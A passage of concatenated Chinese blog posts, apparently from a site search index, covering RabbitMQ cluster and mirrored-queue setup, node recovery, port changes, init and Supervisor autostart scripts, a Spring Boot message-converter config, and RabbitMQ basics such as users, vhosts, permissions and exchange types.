./rabbitmq-server -detached 在节点二执行以下操作，将节点二（rabbit@rabbitmq2）加入到 RabbitMQ 集群 1234567891011# 进入节点二的安装目录# cd /usr/local/rabbitmq/sbin# 停止节点二的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# 将节点二加入到集群中，"--ram" 表示节点二为内存节点# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# 启动节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 start_app 在节点三执行以下操作，将节点三（rabbit@rabbitmq3）加入到 RabbitMQ 集群 1234567891011# 进入节点三的安装目录# cd /usr/local/rabbitmq/sbin# 停止节点三的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq3 stop_app# 将节点三加入到集群中，"--ram" 表示节点三为内存节点# ./rabbitmqctl -n rabbit@rabbitmq3 join_cluster rabbit@rabbitmq1 --ram# 启动节点三的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq3 start_app 在任意节点上查看集群的状态 12345# 进入安装目录# cd /usr/local/rabbitmq/sbin# 查看集群状态# ./rabbitmqctl cluster_status 搭建集群时，停止 RabbitMQ 服务必须使用 stop_app 命令，而不是 stop 命令，否则无法将节点加入到集群中 默认情况下，RabbitMQ 启动后是磁盘节点，在上面的 join_cluster 命令下，rabbitmq2 和 rabbitmq3 是内存节点，rabbitmq1 是磁盘节点 若要使 rabbitmq2 和 rabbitmq3 都成为磁盘节点，去掉 --ram 参数即可，或者使用 --disc 参数替代 如果想要更改节点类型，可以使用命令 rabbitmqctl change_cluster_node_type disc(ram)，前提是必须停掉 RabbitMQ 服务 测试集群节点若集群节点构建成功，通过浏览器访问任意节点的 Web 控制台，例如 http://192.168.1.109:15672，会看到如下的内容。最后可以在节点一创建队列 test，如果在节点二、节点三的 Web 控制台，也可以看到对应的 test 队列，则说明各集群节点的元数据（队列的结构）同步正常。至此，RabbitMQ 的普通集群搭建完成。 RabbitMQ 镜像集群搭建上面已经完成 RabbitMQ 普通集群的搭建，但并不能保证队列的高可用性，尽管交换机、队列、绑定这些可以复制到集群里的任何一个节点，但是队列内容（消息）不会复制。虽然普通集群解决可以一项目组的节点压力，但队列节点（磁盘节点）宕机会直接导致其他节点的队列（内存节点）无法使用，只能等待队列节点（磁盘节点）重启，所以要想在队列节点（磁盘节点）宕机或故障也能正常应用，就要复制队列内容（消息）到集群里的每个节点，因此必须要创建镜像队列。镜像队列是基于普通的集群模式的，然后再添加一些策略，所以还是得先配置普通集群，然后才能设置镜像队列。设置镜像队列可以在 RabbitMQ 的 Web 控制台进行，也可以通过命令，这里介绍是其中的 Web 控制台设置方式。 创建策略在节点一的 Web 控制台上创建策略： 点击 Admin 菜单 –&gt; 右侧的 Policies 选项 按照图中的内容根据自己的需求填写 Name：策略名称 Pattern：匹配的规则，^a 表示匹配 a 开头的队列，如果是匹配所有的队列，那就是 ^. Definition：使用 ha-mode 模式中的 all，也就是同步所有匹配的队列 点击左侧最下边的 Add/update a policy 按钮新增策略 此时分别登录节点二、节点三的 Web 控制台，同样可以看到刚添加的这个策略 创建队列在节点一的 Web 控制台上创建队列： 点击 Queues 菜单 输入 Name 和 Arguments` 参数的值，别的参数默认即可 Name：队列名称Durability：队列是否持久化Node：消息队列的节点Auto delete：是否自动删除Arguments：使用的策略类型 点击左侧下边的 Add a new queue 按钮新增队列，将鼠标指向 +2 可以显示出另外两台节点 创建消息 点击 ab 队列按钮，拖动滚动条 填写相关内容 2-Persistent：表示持久化Headers：随便填写即可Properties：点击问号，选择一个消息 ID 号Payload：消息内容 点击 Publish message 按钮新增消息，可发现 ab 队列的 Ready 和 Total 中多了一条消息记录 验证高可用性 将节点一的 RabbitMQ 服务关闭，再通过节点一和节点二，查看消息记录是否还存在，结果可以看到在其他节点的消息记录是存在的 再将节点二的 RabbitMQ 服务关闭，通过节点三查看消息记录是否还存在，结果可以看到 ab 队列和消息记录还是存在的，只是变成了只有一个节点 将节点一和节点二的 RabbitMQ 服务重启，从中可以看到 ab 队列后面 +2 变成了红色，鼠标指上去显示镜像无法同步 采取的解决办法是选择在节点二上执行同步命令 12345# 进入节点一的安装目录# cd /usr/local/rabbitmq/sbin# 同步特定的队列# ./rabbitmqctl sync_queue ab 同步完成后，+2 标识又变成了蓝色，这样就测试了 RabbitMQ 集群的高可用性，说明镜像集群配置成功。 FAQ.erlang.cookie 解惑.erlang.cookie 是 Erlang 实现分布式集群的必要文件，Erlang 分布式集群要求每个节点上都要有相同的 .erlang.cookie 文件，同时保证文件的权限是 400。在搭建 RabbitMQ 集群的时候往往会因为 .erlang.cookie 而报各种错误，官方在介绍集群的文档中提到过 .erlang.cookie 一般会存在这两个路径：第一个是 ${home}/.erlang.cookie，第二个就是 /var/lib/rabbitmq/.erlang.cookie，具体说明如下： 如果 RPM 等安装包方式进行安装的，那么这个文件会在 /var/lib/rabbitmq 目录下，完整路径为 /var/lib/rabbitmq/.erlang.cookie 如果使用解压缩方式安装部署 RabbitMQ，那么这个文件会在 ${home} 目录下，也就是用户的 Home 目录下，完整路径为 ${home}/.erlang.cookie 通过 RabbitMQ 的启动日志，可以查看其 Home 目录是哪里，就可以知道 .erlang.cookie 存放在哪里，以及 mnesia 数据库信息存在哪里 12345678# RPM包安装方式node : rabbit@he10home dir : /var/lib/rabbitmqconfig file(s) : /etc/rabbitmq/rabbitmq.config (not found)cookie hash : qhOGp9TtH4Rn+BekiYXxIg==log : /var/log/rabbitmq/rabbit@he07.logsasl log : /var/log/rabbitmq/rabbit@he07-sasl.logdatabase dir : /var/lib/rabbitmq/mnesia/rabbit@he07 12345678# 解压缩安装方式（这里使用Root用户启动）node : rabbit@he10home dir : /rootconfig file(s) : /usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config (not found)cookie hash : 063Gh+RyPjHRzyuSPf9wWA==log : /usr/local/rabbitmq/var/log/rabbitmq/rabbit@he10.logsasl log : /usr/local/rabbitmq/var/log/rabbitmq/rabbit@he10-sasl.logdatabase dir : /usr/local/rabbitmq/var/lib/rabbitmq/mnesia/rabbit@he10 重新将节点加入集群这里假设由于各种原因（例如断电重启、节点宕机重启），节点二无法成功加入到集群，那么可以执行以下操作来解决。特别注意，以下操作会删除节点二的元数据（虚拟机、用户、角色、权限、已持久化的消息等），因此当节点二成功加入集群后，必须重新配置节点二的虚拟机、用户、角色、权限等，否则 RabbitMQ 客户端将无法连接节点二。 首先在节点一里，将节点二移出集群 12345# 进入节点一的安装目录# cd /usr/local/rabbitmq/sbin# 将节点二移出集群# ./rabbitmqctl -n rabbit@rabbitmq1 forget_cluster_node rabbit@rabbitmq2 然后重置节点二的元数据、集群配置等信息，其中会删除虚拟机、用户、角色、权限、已持久化的消息等元数据 1234567891011121314151617# 进入节点二的安装目录# cd /usr/local/rabbitmq/sbin# 后台启动节点二的RabbitMQ服务# ./rabbitmq-server -detached# 停止节点二的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# 重置节点二的元数据、集群配置等信息# ./rabbitmqctl -n rabbit@rabbitmq2 reset# 重新将节点二加入到集群# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# 启动节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 start_app 如果节点二仍然无法加入集群，可以直接删除节点二的所有数据库文件，然后重启节点二的 RabbitMQ 服务，最后重新将节点二加入到集群 1234567891011121314151617181920212223# 进入节点二的安装目录# cd /usr/local/rabbitmq/sbin# 彻底关闭节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop# 删除节点二的数据文件# rm -rf /usr/local/rabbitmq/var/lib/rabbitmq/mnesia/*# 后台启动节点二的RabbitMQ服务# ./rabbitmq-server -detached# 停止节点二的RabbitMQ的服务# ./rabbitmqctl -n rabbit@rabbitmq2 stop_app# 重置节点二的元数据、集群配置等信息# ./rabbitmqctl -n rabbit@rabbitmq2 reset# 重新将节点二加入到集群# ./rabbitmqctl -n rabbit@rabbitmq2 join_cluster rabbit@rabbitmq1 --ram# 启动节点二的RabbitMQ服务# ./rabbitmqctl -n rabbit@rabbitmq2 start_app 强制重置节点，force_reset 命令和 reset 的区别是无条件重置节点，不管当前管理数据库状态以及集群的配置，如果数据库或者集群配置发生错误才使用这个最后的手段 1# ./rabbitmqctl force_reset RabbitMQ 更改默认端口RabbitMQ 默认占用 4369、5672、15672、25672 默认端口号，更改默认端口的方法如下： 更改 15672 端口，配置文件路径：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config 12345678910111213[ {rabbitmq_management, [ {listener, [ {port, 15672}, {ip, "0.0.0.0"}, {ssl, false} ] } ] }]. 更改 5672、25672 端口，配置文件路径：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf 12NODE_PORT=5673DIST_PORT=25673 更改 4369 端口，配置文件路径：/etc/profile，单机可以多个 RabbitMQ 节点共用同一个 ERL_EPMD_PORT 端口 1export ERL_EPMD_PORT=4363 RabbitMQ 集群开机自启动 - 方案一将集群各节点的 RabbitMQ 服务托管给 Systemd 管理，这里以节点一为例子，若其他节点的端口号不相同，默认情况下只需更改服务自启动脚本中对应的端口号即可，该脚本支持单机搭建 RabbitMQ 集群。 1234567891011121314151617# 创建服务自启动脚本# touch /etc/init.d/rabbitmq-cluster-15672# 更改服务自启动脚本，写入后面给出的脚本内容# vim /etc/init.d/rabbitmq-cluster-15672# 服务自启动脚本授权# chmod u+x /etc/init.d/rabbitmq-cluster-15672# 开机自启动# chkconfig rabbitmq-cluster-15672 on# 查看开机自启动列表# chkconfig --list# 关闭开机自启动# chkconfig rabbitmq-cluster-15672 off RabbitMQ 集群各节点的服务管理 1234567891011# 关闭服务# systemctl stop rabbitmq-cluster-15672# 启动服务# systemctl start rabbitmq-cluster-15672# 查看服务状态# systemctl status rabbitmq-cluster-15672# 重启服务# systemctl restart rabbitmq-cluster-15672 ★展开服务自启动脚本的完整内容★ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#!/bin/sh## rabbitmq-cluster-15672 RabbitMQ broker## chkconfig: - 80 05# description: Enable AMQP service provided by RabbitMQ#### BEGIN INIT INFO# Provides: rabbitmq-cluster-15672# Required-Start: $remote_fs $network# Required-Stop: $remote_fs $network# Description: RabbitMQ broker# Short-Description: Enable AMQP service provided by RabbitMQ broker### END INIT INFO# Source function library.. /etc/init.d/functionsexport HOME=/home/rabbitmqPATH=/sbin:/usr/sbin:/bin:/usr/binUSER=rabbitmqNAME=rabbitmq-serverMQ_HOME=/usr/local/rabbitmqDAEMON=${MQ_HOME}/sbin/${NAME}CONTROL=${MQ_HOME}/sbin/rabbitmqctlROTATE_SUFFIX=DESC=rabbitmq-cluster-15672MAX_OPEN_FILES=1048576ulimit -n $MAX_OPEN_FILESSTART_PROG="daemon"PID_FILE=/var/run/rabbitmq/pid-15672LOCK_FILE=/var/lock/subsys/$NAME-15672INIT_LOG_DIR=${MQ_HOME}/var/log/rabbitmqtest -x $DAEMON || exit 0test -x $CONTROL || exit 0RETVAL=0set -e[ -f /etc/default/${NAME} ] &amp;&amp; . /etc/default/${NAME}ensure_pid_dir () { PID_DIR=`dirname ${PID_FILE}` if [ ! -d ${PID_DIR} ] ; then mkdir -p ${PID_DIR} chown -R ${USER}:${USER} ${PID_DIR} chmod 755 ${PID_DIR} fi}remove_pid () { rm -f ${PID_FILE} rmdir `dirname ${PID_FILE}` || :}start_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then echo RabbitMQ is currently running else RETVAL=0 ensure_pid_dir set +e RABBITMQ_PID_FILE=$PID_FILE $START_PROG $DAEMON \\ &gt; "${INIT_LOG_DIR}/startup_log" \\ 2&gt; "${INIT_LOG_DIR}/startup_err" \\ 0&lt;&amp;- &amp; $CONTROL wait $PID_FILE &gt;/dev/null 2&gt;&amp;1 RETVAL=$? set -e case "$RETVAL" in 0) echo SUCCESS if [ -n "$LOCK_FILE" ] ; then touch $LOCK_FILE fi ;; *) remove_pid echo FAILED - check ${INIT_LOG_DIR}/startup_\\{log, _err\\} RETVAL=1 ;; esac fi}stop_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then set +e $CONTROL stop ${PID_FILE} &gt; ${INIT_LOG_DIR}/shutdown_log 2&gt; ${INIT_LOG_DIR}/shutdown_err RETVAL=$? set -e if [ $RETVAL = 0 ] ; then remove_pid if [ -n "$LOCK_FILE" ] ; then rm -f $LOCK_FILE fi else echo FAILED - check ${INIT_LOG_DIR}/shutdown_log, _err fi else echo RabbitMQ is not running RETVAL=0 fi}status_rabbitmq() { set +e if [ "$1" != "quiet" ] ; then $CONTROL status 2&gt;&amp;1 else $CONTROL status &gt; /dev/null 2&gt;&amp;1 fi if [ $? != 0 ] ; then RETVAL=3 fi set -e}rotate_logs_rabbitmq() { set +e $CONTROL rotate_logs ${ROTATE_SUFFIX} if [ $? != 0 ] ; then RETVAL=1 fi set -e}restart_running_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then restart_rabbitmq else echo RabbitMQ is not runnning RETVAL=0 fi}restart_rabbitmq() { stop_rabbitmq start_rabbitmq}case "$1" in start) echo -n "Starting $DESC: " start_rabbitmq echo "$NAME." ;; stop) echo -n "Stopping $DESC: " stop_rabbitmq echo "$NAME." ;; status) status_rabbitmq ;; rotate-logs) echo -n "Rotating log files for $DESC: " rotate_logs_rabbitmq ;; force-reload|reload|restart) echo -n "Restarting $DESC: " restart_rabbitmq echo "$NAME." ;; try-restart) echo -n "Restarting $DESC: " restart_running_rabbitmq echo "$NAME." ;; *) echo "Usage: $0 {start|stop|status|rotate-logs|restart|condrestart|try-restart|reload|force-reload}" &gt;&amp;2 RETVAL=1 ;;esacexit $RETVAL RabbitMQ 集群开机自启动-方案二严格来说 RabbitMQ 并不适用使用 Supervior 来管理服务，因为当手动 Kill 掉 RabbitMQ 的进程时，Supervior 无法正常重启 RabbitMQ 的进程，具体原因可以看这里，但若只是简单实现 RabbitMQ 开机自启动，Supervior 无疑是可以胜任的。 使用 Supervior 托管管理 RabbitMQ 的服务，以节点一为例给出下述配置示例，其他节点只需更改对应的端口号即可。值得一提的是，这里必须指定 environment=HOME=/home/rabbitmq，否则 RabbitMQ 会找不到 .erlang.cookie 而导致启动失败 12345678910111213141516[program:rabbitmq]environment=HOME=/home/rabbitmqdirectory=/usr/local/rabbitmqcommand=/usr/local/rabbitmq/sbin/rabbitmq-serveruser=rabbitmqnumprocs=1autostart=trueautorestart=truestartretries=10process_name=%(program_name)sstdout_logfile_backups=5stdout_logfile_maxbytes=10MBstdout_logfile=/var/log/supervisor/rabbitmq.logstderr_logfile_backups=5stderr_logfile_maxbytes=10MBstderr_logfile=/var/log/supervisor/rabbitmq-error.log 以节点一为例通过 Supervisor 管理 RabbitMQ 服务，其他节点不再累述 1234567891011# 关闭服务# supervisorctl stop rabbitmq# 启动服务# supervisorctl start rabbitmq# 查看服务状态# supervisorctl status rabbitmq# 重启服务# supervisorctl restart rabbitmq RabbitMQ 无法操作集群节点若执行以下命令出现下述的错误，一般是当前执行操作的用户的家目录下的 .erlang.cookie 与 集群节点的 .erlang.cookie 不一致导致。解决办法是集群节点是以哪个用户启动的，就切换到对应的用户，例如 su rabbitmq ，然后再执行集群操作命令。 12# 查看集群状态# ./rabbitmqctl cluster_status 执行集群状态查看命令，出现以下错误信息 12345678910111213141516171819202122232425262728293031Error: unable to perform an operation on node \'rabbit2@rabbitmq2\'. Please see diagnostics information and suggestions below.Most common reasons for this are: * Target node is unreachable (e.g. due to hostname resolution, TCP connection or firewall issues) * CLI tool fails to authenticate with the server (e.g. due to CLI tool\'s Erlang cookie not matching that of the server) * Target node is not runningIn addition to the diagnostics info below: * See the CLI, clustering and networking guides on https://rabbitmq.com/documentation.html to learn more * Consult server logs on node rabbit2@rabbitmq2 * If target node is configured to use long node names, don\'t forget to use --longnames with CLI toolsDIAGNOSTICS===========attempted to contact: [rabbit2@rabbitmq2]rabbit2@rabbitmq2: * connected to epmd (port 4369) on rabbitmq2 * epmd reports node \'rabbit2\' uses port 25674 for inter-node and CLI tool traffic * TCP connection succeeded but Erlang distribution failed * Authentication failed (rejected by the remote node), please check the Erlang cookieCurrent node details: * node name: \'rabbitmqcli-7936-rabbit2@rabbitmq2\' * effective user\'s home directory: /home/centos * Erlang cookie hash: 5hmDFFQNoU5sdfrafENxAg== RabbitMQ 集群配置文件概述这里以节点一为例，各个配置文件的路径如下，其他节点不再累述 123456安装目录：/usr/local/rabbitmq日志目录：/usr/local/rabbitmq/var/log/rabbitmq数据目录：/usr/local/rabbitmq/var/lib/rabbitmq/mnesia配置文件：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq.config环境变量配置文件：/usr/local/rabbitmq/etc/rabbitmq/rabbitmq-env.conf服务自启动脚本：/etc/init.d/rabbitmq-cluster-15672 参考博客 RabbitMQ 集群搭建 .erlang.cookie 解惑 RabbitMQ 官方配置说明 RabbitMQ 更改默认端口 Supervior 管理 RabbitMQ 服务 RabbitMQ 使用分析和高可用集群搭建 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"centos"},{title:"RabbitMQ 开发随笔",url:"/posts/869a4db4.html",text:'SpringBoot 中配置 RabbitMQ 使用自定义消息转换器 业务之间大多数数据都是以 JSON 的数据格式进行传输的，即生产者服务将 JSON 类型的数据发送到对应的队列， 而消费端从队列中接收到的数据类型也是 JSON 类型，为了方便将 Java 对象转为 JSON 类型的数据来传输，此时可以使用 Spring 内置的 Jackson2JsonMessageConverter 消息转换器，具体代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import org.springframework.amqp.rabbit.config.SimpleRabbitListenerContainerFactory;import org.springframework.amqp.rabbit.connection.ConnectionFactory;import org.springframework.amqp.rabbit.core.RabbitAdmin;import org.springframework.amqp.rabbit.core.RabbitTemplate;import org.springframework.amqp.support.converter.Jackson2JsonMessageConverter;import org.springframework.amqp.support.converter.MessageConverter;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;@Configurationpublic class RabbitMqConfig { /** * RabbitMQ的管理对象 * * @param connectionFactory * @return */ @Bean public RabbitAdmin rabbitAdmin(ConnectionFactory connectionFactory) { RabbitAdmin rabbitAdmin = new RabbitAdmin(connectionFactory); return rabbitAdmin; } /** * RabbitMq的消息转换器 * * @return */ @Bean public MessageConverter jsonMessageConverter() { Jackson2JsonMessageConverter messageConverter = new Jackson2JsonMessageConverter(); return messageConverter; } /** * RabbitMq的模版 * * @return */ @Bean public RabbitTemplate rabbitTemplate(ConnectionFactory connectionFactory, MessageConverter messageConverter) { RabbitTemplate template = new RabbitTemplate(connectionFactory); // 设置发送消息时所用的消息转换器 template.setMessageConverter(messageConverter); return template; } /** * RabbitMq的监听容器工厂 * * @return */ @Bean public SimpleRabbitListenerContainerFactory rabbitListenerContainerFactory(ConnectionFactory connectionFactory, MessageConverter messageConverter) { SimpleRabbitListenerContainerFactory factory = new SimpleRabbitListenerContainerFactory(); factory.setConnectionFactory(connectionFactory); // 设置线程数 factory.setConcurrentConsumers(3); // 最大线程数 factory.setMaxConcurrentConsumers(10); // 设置接收消息时所用的消息转换器 factory.setMessageConverter(messageConverter); return factory; }} Java 消息队列任务的平滑关闭分析 https://jaesonchen.iteye.com/blog/2342761 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式 开发随笔"},{title:"RabbitMQ 基础使用教程之二",url:"/posts/39a63bd3.html",text:'RabbitMQ 的非阻塞 I/O NIO 通常也称非阻塞 I/O，包含三大核心部分：Channel（信道）、Buffer（缓冲区）和 Selector（选择器）。NIO 是基于 Channel 和 Buffer 进行操作的，数据总是从信道读取数据到缓冲区中，或者从缓冲区写入到信道中，而 Selector 则用于监听多个信道的时间（比如连接打开，数据到达等）。因此，单线程可以监听多个数据的信道。由于 RabbitMQ 采用类似 NIO（Non-blocking I/O）的做法，选择 TCP 连接复用，不仅可以减少性能开销，同时也便于管理。每个线程把持一个信道，所以信道复用了 Connection 的 TCP 连接。同时 RabbitMQ 可以确保每个线程的私密性，就像拥有独立的连接一样。当每个信道的流量不是很大时，复用单一的 Connection 可以在产生性能瓶颈的情况下有效地节省 TCP 连接资源。但是信道本身的流量很大时，这时候多个信道复用一个 Connection 就会产生性能瓶颈，进而使整体的流量被限制了。此时就需要开辟多个 Connection，将这些信道均摊到这些 Connection 中，至于这些相关的调优策略需要根据业务自身的实际情况进行调节。 RabbitMQ 的 ConnectionFactory、Connection、Channel ConnectionFactory、Connection、Channel 都是 RabbitMQ 对外提供的 API 中最基本的对象。Connection 是 RabbitMQ 的 Socket 连接，它封装了 Socket 协议相关部分逻辑。ConnectionFactory 是客户端与 Broker 的 TCP 连接工厂，负责根据 URI 创建 Connection。Channel 是与 RabbitMQ 打交道的最重要的一个接口，大部分的业务操作是在 Channel 这个接口中完成的，包括定义 Queue、定义 Exchange、绑定 Queue、绑定 Exchange、发布消息等。如果每一次访问 RabbitMQ 都建立一个 Connection，在消息量大的时候建立 TCP Connection 的开销将是巨大的，效率也较低。Channel 是在 Connection 内部建立的逻辑连接，如果应用程序支持多线程，通常每个 Thread 创建单独的 Channel 进行通讯，AMQP Method 包含了 Channel ID 帮助客户端和 Message Broker 识别 Channel，所以 Channel 之间是完全隔离的。Channel 作为轻量级的 Connection 极大减少了操作系统建立 TCP Connection 的开销。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式"},{title:"RabbitMQ 基础使用教程之一",url:"/posts/be3a6fb9.html",text:'相关站点 RabbitMQ 官网 RabbitMQ 官方文档 RabbitMQ 官方教学代码 RabbitMQ 基础概念 AMQP（Advanced Message Queuing Protocol）高级消息队列协议，是应用层协议的一个开放标准，为面向消息的中间件设计。消息中间件主要用于组件之间的解耦，消息的发送者无需知道消息使用者的存在，反之亦然。AMQP 的主要特征是面向消息、队列、路由（包括点对点和发布 / 订阅）、可靠性、安全。RabbitMQ 是一个开源的 AMQP 标准实现，服务器端用 Erlang 语言编写，支持多种客户端，如：Python、Ruby、C#、Java、PHP、GO、JavaScript 等。RabbitMQ 用于在分布式系统中存储转发消息，在易用性、扩展性、高可用性、灵活的路由、集群、事务、高可用的队列、消息排序、问题追踪、可视化管理工具、插件系统等方面表现不俗。 RabbitMQ 的用户角色分类 超级管理员 (administrator)，可登陆管理控制台，可查看所有的信息，并且可以对用户，策略 (policy) 进行操作 监控者 (monitoring)，可登陆管理控制台，同时可以查看 rabbitmq 节点的相关信息 (进程数，内存使用情况，磁盘使用情况等) 策略制定者 (policymaker)，可登陆管理控制台，同时可以对 policy 进行管理。但无法查看节点的相关信息，与 administrator 的对比，administrator 能看到节点信息 普通管理者 (management)，仅可登陆管理控制台，无法看到节点信息，也无法对策略进行管理 其他，无法登陆管理控制台，通常就是普通的生产者和消费者 RabbitMQ 用户与角色管理 1234567891011121314151617181920212223242526# 创建超级管理员用户# rabbitmqctl add_user user_admin your_password# 赋予administrator角色给超级管理员用户# rabbitmqctl set_user_tags user_admin administrator# 创建监控用户# rabbitmqctl add_user user_monitoring your_password# 赋予monitoring角色给监控用户# rabbitmqctl set_user_tags user_monitoring monitoring# 创建某个项目的专用用户，限制只能访问自己项目的virtual hosts# rabbitmqctl add_user&nbsp;user_proj&nbsp;your_password# 赋予management给某个项目的专用用户# rabbitmqctl set_user_tags user_proj management# 查看用户与角色列表# rabbitmqctl list_users# 删除用户# rabbitmqctl delete_user user_admin# 修改用户密码# rabbitmqctl change_password user_admin your_password RabbitMQ 虚拟主机管理 对 RabbitMQ 的用户角色权限进行管理时，可以将 RabbitMQ 理解为普通的数据库，其中 VHostPath 可以类比为数据库名，用户角色权限则是对指定数据库的限制访问。 12345678# 创建虚拟主机# rabbitmqctl add_vhost vhostpath# 删除虚拟主机# rabbitmqctl delete_vhost vhostpath# 列出所有虚拟主机# rabbitmqctl list_vhosts RabbitMQ 用户权限管理 用户权限指的是用户对其所能访问的 VHostPath 的 exchange，queue 的操作权限，包括配置权限，读写权限。配置权限会影响到 exchange，queue 的声明和删除；读写权限影响到从 queue 里取消息，向 exchange 发送消息以及 queue 和 exchange 的绑定 (bind) 操作。例如： 将 queue 绑定到某 exchange 上，需要具有 queue 的可写权限，以及 exchange 的可读权限；向 exchange 发送消息需要具有 exchange 的可写权限；从 queue 里取数据需要具有 queue 的可读权限。详细请参考官方文档中 “How permissions work” 部分。 1234567891011121314151617# 赋予用户权限# rabbitmqctl set_permissions -p VHostPath user_admin ConfP WriteP ReadP# 赋予用户所有权限# rabbitmqctl set_permissions -p VHostPath user_admin \'.*\' \'.*\' \'.*\'# 查看VHostPath下所有用户的权限# rabbitmqctl list_permissions -p VHostPath# 查看指定用户的权限# rabbitmqctl list_user_permissions user_admin# 清除指定用户在指定VHostPath下的权限# rabbitmqctl clear_permissions -p VHostPath user_admin# 清除指定用户的所有权限# rabbitmqctl clear_permissions user_admin RabbitMQ 常用命令 1234567891011# 列出所有队列# rabbitmqctl list_queues# 列出指定队列的信息# rabbitmqctl list_queues queue_name messages_ready messages_unacknowledged# 列出所有交换机# rabbitmqctl list_exchanges# 列出所有绑定# rabbitmqctl list_bindings RabbitMQ Simple Queue 模式（简单队列） 简单队列模式下，每条消息只会被一个消费者所接收，不存在多个消费者接收到同一条消息的情况，而且不管有多少个消费者，默认情况下服务端都会以轮询分发（round-robin）的方式确保每个消费者接收到的消息数量是一样的。 RabbitMQ Work Queue 模式（工作队列） 工作队列模式下，每条消息只会被一个消费者所接收，不存在多个消费者接收到同一条消息的情况；同时工作队列模式可以使用公平分发（fair dispatch）的方式来发送消息，特点是处理能力强的消费者可以接收到更多的消息（能者多劳），这也是与简单队列模式相比较不同的地方。当使用公平分发时，消费者可调用 basicQos（）方法，同时需要手动确认消息（ACK 机制）。 RabbitMQ Fanout 模式（发布 / 订阅） 单个生产者可以对应多个消费者，每个消费者都有自己的队列，同一条消息可以被多个消费者接收。所有发送到 Fanout Exchange 的消息都会被转发到与该 Exchange 绑定 (Binding) 的所有 Queue 上。Fanout Exchange 不需要额外处理 RouteKey，只需要简单地将队列绑定到 Exchange 上，这样发送到 Exchange 的消息都会被转发到与该交换机绑定的所有队列上，作用类似子网广播，每台子网内的主机都获得了一份复制的消息，因此 Fanout Exchange 转发消息是最快的。 RabbitMQ Direct 模式（路由） 单个生产者可以对应多个消费者，每个消费者都有自己的队列，同一条消息可以被多个消费者接收。所有发送到 Direct Exchange 的消息会被转发到 RouteKey 中指定的 Queue 上。消息传递时，RouteKey 必须完全匹配，才会被队列接收，否则该消息会被抛弃。 RabbitMQ Topic 模式（通配符） 单个生产者可以对应多个消费者，每个消费者都有自己的队列，同一条消息可以被多个消费者接收。所有发送到 Topic Exchange 的消息会被转发到指定 Topic 的 Queue 上，Exchange 会将 RouteKey 和某个 Topic 进行模糊匹配，此时队列需要绑定一个 Topic。RouteKey 可以使用通配符进行模糊匹配，符号”#” 表示匹配一个或多个词，符号”*” 表示匹配不多不少一个词。因此”log.#” 能够匹配到”log.info.oa”，但是”log.*” 只会匹配到”log.error”，所以 Topic Exchange 的使用非常灵活。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "全栈技术驿站", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "random": "0.9" }); } catch(e) { console.warn(e.name + " : " + e.message); } }',tags:"分布式"},{title:"Centos7 生产环境安装 RabbitMQ",url:"/posts/ffb541a9.html",text:'相关站点 Erlang 官方下载地址 RabbitMQ 官方下载地址 RabbitMQ 官方插件下载地址 系统环境 12CentOS Linux release 7.6.1810 (Core)Linux 